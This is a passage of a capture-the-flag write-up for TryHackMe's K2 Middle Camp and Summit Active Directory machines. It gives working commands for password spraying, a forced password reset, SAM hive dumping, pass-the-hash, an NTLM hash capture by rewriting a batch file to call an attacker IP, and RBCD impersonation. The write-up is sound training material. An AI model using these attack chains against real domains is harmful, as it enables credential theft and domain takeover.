</span></span><span style=display:flex><span><span style=color:#e06c75>numbers</span><span style=color:#56b6c2>=(</span><span style=color:#d19a66>0</span> <span style=color:#d19a66>1</span> <span style=color:#d19a66>2</span> <span style=color:#d19a66>3</span> <span style=color:#d19a66>4</span> <span style=color:#d19a66>5</span> <span style=color:#d19a66>6</span> <span style=color:#d19a66>7</span> <span style=color:#d19a66>8</span> 9<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>output_file</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;james_passwords.txt&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&gt; <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$output_file</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>for</span> special in <span style=color:#98c379>&#34;</span><span style=color:#98c379>${</span><span style=color:#e06c75>special_characters</span>[@]<span style=color:#98c379>}</span><span style=color:#98c379>&#34;</span>; <span style=color:#c678dd>do</span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>for</span> number in <span style=color:#98c379>&#34;</span><span style=color:#98c379>${</span><span style=color:#e06c75>numbers</span>[@]<span style=color:#98c379>}</span><span style=color:#98c379>&#34;</span>; <span style=color:#c678dd>do</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;</span><span style=color:#98c379>${</span><span style=color:#e06c75>special</span><span style=color:#98c379>}${</span><span style=color:#e06c75>number</span><span style=color:#98c379>}</span><span style=color:#98c379>rockyou&#34;</span> &gt;&gt; <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$output_file</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;</span><span style=color:#98c379>${</span><span style=color:#e06c75>number</span><span style=color:#98c379>}${</span><span style=color:#e06c75>special</span><span style=color:#98c379>}</span><span style=color:#98c379>rockyou&#34;</span> &gt;&gt; <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$output_file</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;rockyou</span><span style=color:#98c379>${</span><span style=color:#e06c75>number</span><span style=color:#98c379>}${</span><span style=color:#e06c75>special</span><span style=color:#98c379>}</span><span style=color:#98c379>&#34;</span> &gt;&gt; <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$output_file</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;rockyou</span><span style=color:#98c379>${</span><span style=color:#e06c75>special</span><span style=color:#98c379>}${</span><span style=color:#e06c75>number</span><span style=color:#98c379>}</span><span style=color:#98c379>&#34;</span> &gt;&gt; <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$output_file</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>done</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>done</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;Password list generated in </span><span style=color:#e06c75>$output_file</span><span style=color:#98c379>&#34;</span>
</span></span></code></pre></div><p>We can then use that list against the valid username <code>j.bold</code>.</p><pre tabindex=0><code>./kerbrute bruteuser --dc K2Server.k2.thm -d k2.thm james_passwords.txt j.bold
</code></pre><p><img src=/images/THM-K2/jbold_pwd_found.png alt="j.bold credentials found"></p><p>We find the valid credentials <code>j.bold:#8rockyou</code>. Still we are unable to login via evil-winrm for james because his <code>Remote Access</code> was removed.</p><p>We can confirm this with the outputs of <code>net user r.bud</code> and <code>net user j.bold</code>. Rose Bud is part of the <code>Remote Management Use</code> group.</p><p><img src=/images/THM-K2/rosebud_remote_access.png alt="rose group memberships"></p><p>But James Bold is not.</p><p><img src=/images/THM-K2/jbold_no_remote_access.png alt="j.bold group memberships"></p><p>Let&rsquo;s run Bloodhound with the credentials for Rose Bud.</p><pre tabindex=0><code>bloodhound-python -c all -u r.bud -p &#39;vRMkaVgdfxhW!8&#39; -d k2.thm -dc K2Server.k2.thm -ns 10.10.70.233
</code></pre><p><img src=/images/THM-K2/rose_bud_bloodhound_py.png alt="bloodhound-python command"></p><p>Start the database</p><pre tabindex=0><code>sudo neo4j start
</code></pre><p>Launch Bloodhound</p><pre tabindex=0><code>bloodhound --no-sandbox
</code></pre><p>Under the <code>Analysis</code> section we select <code>Find Shortest Paths to Domain Admins</code>.</p><p>We discover that the members of the <code>IT STAFF 1</code> (which James is part of) have the <code>GenericAll</code> permission on <code>J.SMITH</code>.</p><p><img src=/images/THM-K2/jbold_GenericAll.png alt="IT STAFF 1 members - GenericAll permission"></p><p>We right click on the <code>GenericAll</code> thread, select <code>Help</code> and under <code>Linux Abuse</code> we read that we can change the password of the user.</p><p><img src=/images/THM-K2/ForceChangePassword.png alt="ForceChangePassword command"></p><pre tabindex=0><code>net rpc password &#34;TargetUser&#34; &#34;newP@ssword2022&#34; -U &#34;DOMAIN&#34;/&#34;ControlledUser&#34;%&#34;Password&#34; -S &#34;DomainController&#34;
</code></pre><p><img src=/images/THM-K2/jsmith_pwd_change.png alt="jsmith password change"></p><h3 id=lateral-movement-shell-as-jsmith>Lateral Movement (shell as j.smith)</h3><p>We then login with evil-winrm and recover the user flag on the Desktop.</p><pre tabindex=0><code>evil-winrm -i k2.thm -u j.smith -p &#34;Paswword#@2024&#34;
</code></pre><p><img src=/images/THM-K2/jsmith_login.png alt="jsmith login"></p><h2 id=what-are-the-usernames-found-on-the-server>What are the usernames found on the server?</h2><p>The usernames found are:</p><pre tabindex=0><code>j.bold,j.smith,r.bud
</code></pre><h2 id=what-is-the-root-flag-1>What is the root flag?</h2><p>Back on Bloodhound, we notice that <code>J.SMITH</code> is part of the <code>Backup Operators</code> group.</p><p><img src=/images/THM-K2/JSMITH_backup_operators.png alt="jsmith Backup Operators membership"></p><p><img src=/images/THM-K2/Backup_Operators_AD_info.png alt="Backup Operators group info">
<em><a href=https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#backup-operators>Source</a></em></p><p>On <a href=https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators>this HackTricks page</a>, we find two different methods to abuse the membership to the <code>Backup Operators</code> group. The first method <code>Local Attack</code> will help us get the root flag.</p><ol><li>We need to transfer two necessary dll files: <code>SeBackupPrivilegeUtils.dll</code> and <code>SeBackupPrivilegeCmdLets.dll</code>. They are available at <a href=https://github.com/giuliano108/SeBackupPrivilege>this Github</a> repo.</li></ol><p>After cloning the repo we send the files to the target via our evil-winrm shell.</p><pre tabindex=0><code>upload /home/kscorpio/Machines/TryHackMe/K2/K2_Middle_Camp/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll

upload /home/kscorpio/Machines/TryHackMe/K2/K2_Middle_Camp/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
</code></pre><p><img src=/images/THM-K2/DLLs_uploads.png alt="DLL file uploads"></p><ol start=2><li>Import the libraries</li></ol><pre tabindex=0><code>Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
</code></pre><p><img src=/images/THM-K2/Import_DLLs.png alt="Import DLL"></p><ol start=3><li>We can now access and copy files located in restricted directories</li></ol><pre tabindex=0><code>cd C:\Users\Administrator\

Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\root.txt C:\Users\j.smith\Documents\root.txt -Overwrite
</code></pre><ol start=4><li>With the commands above we will copy the root flag in <code>C:\Users\j.smith\Documents</code></li></ol><p><img src=/images/THM-K2/root_flag_k2MC.png alt="Read Rood flag"></p><h2 id=what-is-the-administrators-ntlm-hash>What is the Administrator&rsquo;s NTLM hash?</h2><h3 id=privilege-escalation>Privilege Escalation</h3><p><img src=/images/THM-K2/SeBackUpPriv.png alt=SeBackUpPriv></p><p>Because of the <code>SeBackupPrivilege</code> we can get copies of the SAM and SYSTEM hives.</p><p><img src=/images/THM-K2/SeBackupPrivilege_info.png alt="SeBackUpPriv information">
<em><a href=https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges>Source</a></em></p><pre tabindex=0><code>reg save hklm\sam C:\Windows\Temp\SAM

reg save hklm\system C:\Windows\Temp\SYSTEM
</code></pre><p><img src=/images/THM-K2/reghives_copy.png alt="reghives copy"></p><p>We then transfer the hives to our local machine.</p><pre tabindex=0><code>download C:\Windows\Temp\SAM

download C:\Windows\Temp\SYSTEM
</code></pre><p>With <code>impacket</code> we can dump the hashes by using the hives we downloaded.</p><pre tabindex=0><code>impacket-secretsdump -sam SAM -system SYSTEM local
</code></pre><p><img src=/images/THM-K2/Admin_hash.png alt="Admin hash"></p><p>Using the <code>Administrator</code> hash, we login with evil-winrm.</p><pre tabindex=0><code>evil-winrm -i k2.thm -u Administrator -H &#34;9545b61858c043477c350ae86c37b32f&#34;
</code></pre><p>Furthermore we can retrieve the administrator password with netexec.</p><pre tabindex=0><code>netexec smb k2.thm -u Administrator -H &#34;9545b61858c043477c350ae86c37b32f&#34; --dpapi
</code></pre><p><img src=/images/THM-K2/admin_pwd.png alt="Admin password"></p><p>The credentials are <code>Administrator:vz0q$i8b4c</code>.</p><p>Next is the final machine for this room, The Summit.</p><h1 id=the-summit>The Summit</h1><p>The Summit machine, the final part of the K2 challenge, is also a Domain Controller. Through Active Directory enumeration, we uncover valid credentials, gaining an initial foothold. We then exploit some file misconfigurations related to a <code>.bat</code> file to obtain the file owner&rsquo;s password hash, which, once cracked, grants us access to that user account. Bloodhound reveals that this user is part of a group with the <code>GenericWrite</code> permission on the Domain Controller, enabling us to perform Resource-Based Constrained Delegation (RBCD). Using this, we retrieve the <code>Administrator</code> hash, and recover the root flag.</p><h2 id=scanning-the-summit>Scanning (The Summit)</h2><p>Update <code>/etc/hosts</code> and scan the target.</p><pre tabindex=0><code>sudo nmap -sC -sV -oA nmap/k2_Summit k2.thm
</code></pre><p><strong>Results</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-10-16 16:56 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> k2.thm <span style=color:#56b6c2>(</span>10.10.124.173<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.19s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>988</span> filtered tcp ports <span style=color:#56b6c2>(</span>no-response<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE       VERSION
</span></span><span style=display:flex><span>53/tcp   open  domain        Simple DNS Plus
</span></span><span style=display:flex><span>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span style=color:#56b6c2>(</span>server time: 2024-10-16 21:57:18Z<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>135/tcp  open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style=display:flex><span>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: k2.thm0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>445/tcp  open  microsoft-ds?
</span></span><span style=display:flex><span>464/tcp  open  kpasswd5?
</span></span><span style=display:flex><span>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style=display:flex><span>636/tcp  open  tcpwrapped
</span></span><span style=display:flex><span>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: k2.thm0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>3269/tcp open  tcpwrapped
</span></span><span style=display:flex><span>3389/tcp open  ms-wbt-server Microsoft Terminal Services
</span></span><span style=display:flex><span>| rdp-ntlm-info: 
</span></span><span style=display:flex><span>|   Target_Name: K2
</span></span><span style=display:flex><span>|   NetBIOS_Domain_Name: K2
</span></span><span style=display:flex><span>|   NetBIOS_Computer_Name: K2ROOTDC
</span></span><span style=display:flex><span>|   DNS_Domain_Name: k2.thm
</span></span><span style=display:flex><span>|   DNS_Computer_Name: K2RootDC.k2.thm
</span></span><span style=display:flex><span>|   DNS_Tree_Name: k2.thm
</span></span><span style=display:flex><span>|   Product_Version: 10.0.17763
</span></span><span style=display:flex><span>|_  System_Time: 2024-10-16T21:57:30+00:00
</span></span><span style=display:flex><span>|_ssl-date: 2024-10-16T21:58:09+00:00; 0s from scanner time.
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>K2RootDC.k2.thm
</span></span><span style=display:flex><span>| Not valid before: 2024-10-15T21:52:04
</span></span><span style=display:flex><span>|_Not valid after:  2025-04-16T21:52:04
</span></span><span style=display:flex><span>Service Info: Host: K2ROOTDC; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span>| smb2-security-mode: 
</span></span><span style=display:flex><span>|   3:1:1: 
</span></span><span style=display:flex><span>|_    Message signing enabled and required
</span></span><span style=display:flex><span>| smb2-time: 
</span></span><span style=display:flex><span>|   date: 2024-10-16T21:57:33
</span></span><span style=display:flex><span>|_  start_date: N/A
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 77.09 seconds
</span></span></code></pre></div><p>The final machine is another Domain Controller with the name of <code>K2RootDC.k2.thm</code>.</p><h2 id=what-is-the-user-flag-2>What is the user flag?</h2><h3 id=enumeration-2>Enumeration</h3><p>We update our list before starting the AD enumeration.</p><p><strong>Possible AD usernames</strong></p><pre tabindex=0><code>j.bold
j.smith
r.bud
administrator
</code></pre><p><strong>Passwords Found</strong></p><pre tabindex=0><code>Pwd@9tLNrC3!
RdzQ7MSKt)fNaz3!
vRMkaVgdfxhW!8
#8rockyou
vz0q$i8b4c
</code></pre><p>Let&rsquo;s use <code>Kerbrute</code> to find the valid usernames first.</p><p><img src=/images/THM-K2/valid_users_k2S.png alt="K2-The Summit AD enumeration"></p><p>Once again we spray our passwords against the valid users.</p><pre tabindex=0><code>kerbrute bruteuser --dc K2RootDC.k2.thm -d k2.thm potential_pwds.txt j.smith

kerbrute bruteuser --dc K2RootDC.k2.thm -d k2.thm potential_pwds.txt administrator
</code></pre><p><img src=/images/THM-K2/JSMITH_valid_creds.png alt="JSMITH valid credentials"></p><p>We find the valid credentials: <code>j.smith:vz0q$i8b4c</code>. (This is the admin password from the Middle Camp machine).</p><blockquote><p>The second command does not find any valid passwords.</p></blockquote><h3 id=initial-foothold-shell-as-jsmith>Initial Foothold (shell as j.smith)</h3><p>We login with evil-winrm as <code>j.smith</code> but no user flag yet. None of the different directories for this user have anything interesting.</p><pre tabindex=0><code>evil-winrm -i k2.thm -u j.smith -p &#34;vz0q$i8b4c&#34;
</code></pre><p><img src=/images/THM-K2/k2_Summit_JSMITH_login.png alt="JSMITH login"></p><p>In <code>C:\Scripts</code> we find a file called <code>backup.bat</code>. It executes the following command</p><pre tabindex=0><code>copy C:\Users\o.armstrong\Desktop\notes.txt C:\Users\o.armstrong\Documents\backup_notes.txt
</code></pre><p><img src=/images/THM-K2/bat_file.png alt="Bat file content"></p><p>Checking the permissions on the file and its parent directory, we discover that <code>j.smith</code> the user we currently control has full control over <code>C:/Scripts</code>.</p><pre tabindex=0><code>Get-Acl -Path &#34;C:\Scripts\backup.bat&#34;

Get-Acl -Path &#34;C:\Scripts&#34;
</code></pre><p><img src=/images/THM-K2/file_permissions.png alt="File permissions"></p><p>We can exploit this and get the hash of <code>o.armstrong</code>.</p><ol><li>Set up Responder to catch the hash</li></ol><pre tabindex=0><code>sudo responder -I tun0
</code></pre><ol start=2><li>Remove the existing <code>backup.bat</code> file and create another one of the same name with a different content</li></ol><pre tabindex=0><code>rm backup.bat

Set-Content -Path &#34;C:\Scripts\backup.bat&#34; -Value &#39;copy \\YOUR_IP\share\notes.txt C:\Users\o.armstrong\Documents\backup_notes.txt&#39;
</code></pre><blockquote><p>Notice the different file sizes (Our malicious bat file is the second one)</p></blockquote><p><img src=/images/THM-K2/backup_file_replace.png alt="Malicious bat file"></p><p>After a little bit of time we get the hash on Responder.</p><p><img src=/images/THM-K2/o_amstrong_hash.png alt="o.arnstrong hash"></p><p>We crack it with hashcat and recover the password <code>arMStronG08</code>.</p><pre tabindex=0><code>hashcat -a 0 -m 5600 oamstrong_hash.txt /usr/share/wordlists/rockyou.txt
</code></pre><p><img src=/images/THM-K2/oamstrong_hash_cracked.png alt="o.arnstrong hash cracked"></p><h3 id=lateral-movement-shell-as-oarmstrong>Lateral Movement (shell as o.armstrong)</h3><p>Using evil-winrm we login as <code>o.armstrong</code> and find the user flag.</p><p><img src=/images/THM-K2/oarmstrong_login.png alt="o.arnstrong login"></p><p>The <code>notes.txt</code> file alludes to a checklist.</p><p><img src=/images/THM-K2/k2_summit_notes_file.png alt="o.arnstrong notes.txt file"></p><h2 id=what-is-the-root-flag-2>What is the root flag?</h2><h3 id=privilege-escalation-1>Privilege Escalation</h3><p>Let&rsquo;s run Bloodhound and try to find some privilege escalation paths.</p><pre tabindex=0><code>bloodhound-python -c all -u j.smith -p &#39;vz0q$i8b4c&#39; -d k2.thm -dc K2RootDC.k2.thm -ns 10.10.124.173
</code></pre><p>Start the database and launch Bloodhound.</p><pre tabindex=0><code>sudo neo4j start

bloodhound --no-sandbox
</code></pre><p><code>o.armstrong</code> is part of the <code>IT DIRECTOR</code> group and its members have the <code>GenericWrite</code> permission on the DC. We can exploit that permission via resource-based constrained delegation (RBCD).</p><p><img src=/images/THM-K2/IT_Director_membership.png alt="o.arnstrong IT DIRECTOR MEMBERSHIP"></p><p><img src=/images/THM-K2/GenericWrite_Perm.png alt="IT DIRECTOR GenericWrite permission"></p><blockquote><p><strong>Resource-Based Constrained Delegation (RBCD)</strong> is a way in which a service on one machine in a Windows domain can act on behalf of a user when accessing resources on another machine. It&rsquo;s part of Kerberos authentication, commonly used in Active Directory environments. <em>Read more about it <a href=https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation>here</a></em>.</p></blockquote><ol><li>Create a computer account in the domain</li></ol><pre tabindex=0><code>impacket-addcomputer -computer-name &#39;KSCORPIO$&#39; -computer-pass &#39;LETSgetr00t!&#39; -dc-host K2RootDC.k2.thm -domain-netbios k2.thm k2.thm/o.armstrong:&#39;arMStronG08&#39;
</code></pre><p><img src=/images/THM-K2/RBCD1.png alt="RBCD step 1"></p><ol start=2><li>Modify <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute on the DC to include our newly created computer object in order to allow impersonation.</li></ol><pre tabindex=0><code>impacket-rbcd -delegate-from &#39;KSCORPIO$&#39; -delegate-to &#39;K2RootDC$&#39; -dc-ip 10.10.124.173 -action &#39;write&#39; &#39;k2.thm/o.armstrong:arMStronG08&#39;
</code></pre><p><img src=/images/THM-K2/RBCD2.png alt="RBCD step 2"></p><ol start=3><li>Obtain a Kerberos ticket while impersonating <strong>Administrator</strong>.</li></ol><pre tabindex=0><code>impacket-getST -spn &#39;cifs/K2RootDC.k2.thm&#39; -impersonate Administrator -dc-ip 10.10.124.173 k2.thm/KSCORPIO$:&#39;LETSgetr00t!&#39;
</code></pre><p><img src=/images/THM-K2/RBCD3.png alt="RBCD step 3"></p><ol start=4><li>For Impacket to use our ticket we set an environment variable with our cache file name.</li></ol><pre tabindex=0><code>export KRB5CCNAME=Administrator@cifs_K2RootDC.k2.thm@K2.THM.ccache
</code></pre><ol start=5><li>Dump the NTLM hashes from the DC.</li></ol><pre tabindex=0><code>impacket-secretsdump &#39;k2.thm/Administrator@K2RootDC.k2.thm&#39; -k -no-pass -dc-ip 10.10.124.173 -target-ip 10.10.124.173 -just-dc-ntlm
</code></pre><p><img src=/images/THM-K2/RBCD4.png alt="RBCD step 4"></p><p>With the administrator hash we can login with evil-winrm and read the root flag.</p><pre tabindex=0><code>evil-winrm -i k2.thm -u Administrator -H &#34;15ecc755a43d2e7c8001215609d94b90&#34;
</code></pre><p><img src=/images/THM-K2/root_flag_K2S.png alt="K2 -Summit root flag"></p><p>This room was one of the best I have done on TryHackMe so far, I enjoyed its chain-like nature and how the machines were building on top of each other. I will leave some references below if anyone is interested, thank you for taking the time to read this <strong>long</strong> write up!</p><h2 id=references>References</h2><ul><li><p><a href=https://tib3rius.com/sqli.html>Tib3rius SQLi cheatsheet</a></p></li><li><p>TryHackMe have three <strong>free rooms</strong> that will give you a good foundation for SQLi:</p><ul><li><a href=https://tryhackme.com/r/room/sqlinjectionlm>SQL Injection</a></li><li><a href=https://tryhackme.com/r/room/advancedsqlinjection>Advanced SQL Injection</a></li><li><a href=https://tryhackme.com/r/room/sqlilab>SQL Injection Lab</a></li></ul></li><li><p>Install Bloodhound with Docker Compose (simpler setup) available <a href=https://support.bloodhoundenterprise.io/hc/en-us/articles/17468450058267-Install-BloodHound-Community-Edition-with-Docker-Compose#h_01H9MMVW3J42013Q0P68WSRK2R>here</a>.</p></li><li><p>Abusing membership to <code>Backup Operators</code>, access and copy files from restricted directories -> <a href=https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators>here</a>.</p></li><li><p>Learn what CIFS is (used at step 3 of RBCD) -> <a href=https://www.upguard.com/blog/cifs>What is CIFS?</a></p></li></ul></div><div class=prev-next><div class=prev-post><p><a href=/posts/htb-editorial/>&#8592;
Previous:
HTB: Editorial</a></p><p class=prev-post-date>October 16, 2024</p></div><div class=next-post><p><a href=/posts/thm-rabbithole/>Next:
THM: Rabbit Hole
&#8594;</a></p><p class=next-post-date>October 29, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><a href=#base-camp>Base Camp</a><ul><li><a href=#scanning-base-camp>Scanning (Base Camp)</a></li><li><a href=#what-is-the-user-flag>What is the user flag?</a><ul><li><a href=#enumeration>Enumeration</a></li><li><a href=#initial-foothold-shell-as-james>Initial Foothold (shell as james)</a></li></ul></li><li><a href=#what-is-the-root-flag>What is the root flag?</a><ul><li><a href=#privilege-escaltion>Privilege Escaltion</a></li></ul></li><li><a href=#what-are-the-usernames-and-passwords-that-had-access-to-the-server>What are the usernames and passwords that had access to the server?</a></li><li><a href=#two-users-have-their-full-names-on-display-what-are-their-names>Two users have their full names on display. What are their names?</a></li></ul></li><li><a href=#middle-camp>Middle Camp</a><ul><li><a href=#scanning-middle-camp>Scanning (Middle Camp)</a></li><li><a href=#what-is-the-user-flag-1>What is the user flag?</a><ul><li><a href=#enumeration-1>Enumeration</a><ul><li><a href=#netexec-method>NetExec Method</a></li><li><a href=#kerbrute-method>Kerbrute Method</a></li></ul></li></ul></li><li><a href=#initial-foothold-shell-as-rose>Initial Foothold (shell as rose)</a><ul><li><a href=#lateral-movement-shell-as-jsmith>Lateral Movement (shell as j.smith)</a></li></ul></li><li><a href=#what-are-the-usernames-found-on-the-server>What are the usernames found on the server?</a></li><li><a href=#what-is-the-root-flag-1>What is the root flag?</a></li><li><a href=#what-is-the-administrators-ntlm-hash>What is the Administrator&rsquo;s NTLM hash?</a><ul><li><a href=#privilege-escalation>Privilege Escalation</a></li></ul></li></ul></li><li><a href=#the-summit>The Summit</a><ul><li><a href=#scanning-the-summit>Scanning (The Summit)</a></li><li><a href=#what-is-the-user-flag-2>What is the user flag?</a><ul><li><a href=#enumeration-2>Enumeration</a></li><li><a href=#initial-foothold-shell-as-jsmith>Initial Foothold (shell as j.smith)</a></li><li><a href=#lateral-movement-shell-as-oarmstrong>Lateral Movement (shell as o.armstrong)</a></li></ul></li><li><a href=#what-is-the-root-flag-2>What is the root flag?</a><ul><li><a href=#privilege-escalation-1>Privilege Escalation</a></li></ul></li><li><a href=#references>References</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>